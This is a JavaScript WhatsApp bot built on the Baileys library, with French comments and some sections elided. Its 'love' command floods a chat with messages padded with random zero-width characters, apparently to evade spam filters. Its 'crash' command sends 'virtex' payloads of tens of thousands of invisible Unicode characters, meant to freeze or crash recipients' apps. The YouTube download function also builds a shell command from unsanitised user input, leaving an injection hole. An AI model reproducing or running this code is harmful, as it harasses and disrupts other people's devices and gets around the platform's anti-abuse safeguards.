const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, DisconnectReason, downloadMediaMessage } = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { exec } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const { Jimp } = require("jimp");
const { OpenAI } = require("openai");

// --- CONFIGURATION ---
const groq = new OpenAI({
    apiKey: process.env.GROQ_API_KEY || "gsk_yK6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Y",
    baseURL: "https://api.groq.com/openai/v1",
});

const SESSIONS_DIR = path.join(__dirname, "sessions");
const TEMP_DIR = path.join(__dirname, "temp");
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

// --- COLLECTIONS DE TEXTES SPÉCIAUX ---
const VIRTEX_PAYLOADS = [
    "\u200e\u200f".repeat(10000), // Caractères de direction RTL/LTR
    "\u00ad".repeat(10000), // Soft Hyphen
    "\u200b".repeat(20000), // Zero-width space
    "\u061c".repeat(10000) // Arabic Letter Mark
];

// --- VARIABLES GLOBALES ---
const activeSessions = new Map();
const hostingStates = new Map();
const messageCache = new Map();
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// --- FONCTIONS UTILITAIRES ---

const getInvisibleJunk = () => {
    const chars = ["\u200B", "\u200C", "\u200D"];
    let junk = "";
    const length = Math.floor(Math.random() * 5) + 1;
    for (let i = 0; i < length; i++) {
        junk += chars[Math.floor(Math.random() * chars.length)];
    }
    return junk;
};

async function downloadYouTubeMP3(query) {
    return new Promise((resolve, reject) => {
        const filename = `audio_${Date.now()}.mp3`;
        const outputPath = path.join(TEMP_DIR, filename);
        const cmd = `yt-dlp -x --audio-format mp3 --embed-thumbnail --add-metadata -o "${outputPath}" "ytsearch1:${query}"`;
        
        exec(cmd, (error, stdout, stderr) => {
            if (error) {
                reject(new Error(`Échec du téléchargement YouTube: ${stderr || error.message}`));
            } else {
                resolve(outputPath);
            }
        });
    });
}

// ... (Les autres fonctions comme uploadToCatbox, logMessage, etc. restent identiques)

// --- FONCTION PRINCIPALE DU BOT ---

async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify = null) {
    const cleanNumber = phoneNumber.replace(/[^0-9]/g, "");
    const sessionPath = path.join(SESSIONS_DIR, cleanNumber);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
    });

    activeSessions.set(cleanNumber, { sock, isBotActive: false, activeSpams: new Set() });

    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(cleanNumber);
                const msg = `✅ *SESSION GÉNÉRÉE*\n\nNuméro : ${cleanNumber}\nCode : *${code}*`;
                console.log(`Code d'appairage pour ${cleanNumber} : ${code}`);
                if (sockToNotify && jidToNotify) {
                    await sockToNotify.sendMessage(jidToNotify, { text: msg });
                }
            } catch (e) {
                console.error("Erreur lors de la demande du code :", e);
            }
        }, 5000);
    }

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "close") {
            if ((lastDisconnect?.error instanceof Boom) && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                await sleep(5000);
                createBotInstance(cleanNumber);
            }
        } else if (connection === "open") { console.log(`[${cleanNumber}] ✅ CONNECTÉ (Statut: OFF)`); }
    });

    sock.ev.on("messages.upsert", async (m) => {
        const msg = m.messages[0];
        if (!msg.message || msg.key.remoteJid === "status@broadcast") return;

        const remoteJid = msg.key.remoteJid;
        const isFromMe = msg.key.fromMe;
        const text = (msg.message.conversation || msg.message.extendedTextMessage?.text || "").trim();
        const lowerText = text.toLowerCase();
        const current = activeSessions.get(cleanNumber);
        if (!current) return;

        // ... (logique des autres commandes: on, off, menu, etc.)

        if (isFromMe && lowerText.startsWith("love ")) {
            const args = text.slice(5).trim().split(" ");
            if (args.length < 2) return sock.sendMessage(remoteJid, { text: "❌ Usage: love [texte] [quantité] [délai_ms]" });

            const count = parseInt(args[args.length - 2]) || 10;
            const delay = parseInt(args[args.length - 1]) || 1000;
            const word = args.slice(0, -2).join(" ");

            current.activeSpams.add(remoteJid);
            await sock.sendMessage(remoteJid, { text: `🚀 *SPAM OPTIMISÉ*\nMessage: ${word}\nNombre: ${count}\nDélai: ${delay}ms\n_Tapez "stop" pour arrêter._` });

            for (let i = 1; i <= count; i++) {
                if (!current.activeSpams.has(remoteJid)) break;
                
                const messageToSend = word + getInvisibleJunk();
                await sock.sendMessage(remoteJid, { text: messageToSend });
                
                const jitter = delay * (0.9 + Math.random() * 0.2);
                await sleep(jitter);
            }
            current.activeSpams.delete(remoteJid);
            return;
        }

        if (isFromMe && lowerText === "stop") {
            if (current.activeSpams.has(remoteJid)) {
                current.activeSpams.delete(remoteJid);
                await sock.sendMessage(remoteJid, { text: "🛑 Spam arrêté avec succès." });
            }
            return;
        }

        if (isFromMe && lowerText.startsWith("crash")) {
            const count = parseInt(lowerText.split(" ")[1]) || 5;
            await sock.sendMessage(remoteJid, { text: `☣️ *CRASH TEST*\nEnvoi de ${count} charges lourdes...` });
            for (let i = 0; i < count; i++) {
                const payload = VIRTEX_PAYLOADS[Math.floor(Math.random() * VIRTEX_PAYLOADS.length)];
                await sock.sendMessage(remoteJid, { text: payload });
                await sleep(200);
            }
            await sock.sendMessage(remoteJid, { text: "✅ Opération terminée." });
            return;
        }

        // ... (le reste de la logique des messages)
    });
}

async function start() {
    console.log("--- DÉMARRAGE STONE 2 ---");
    const mainNum = "16062620863"; // Numéro fixe pour déploiement non-interactif
    createBotInstance(mainNum.replace(/[^0-9]/g, ""));
}

start();
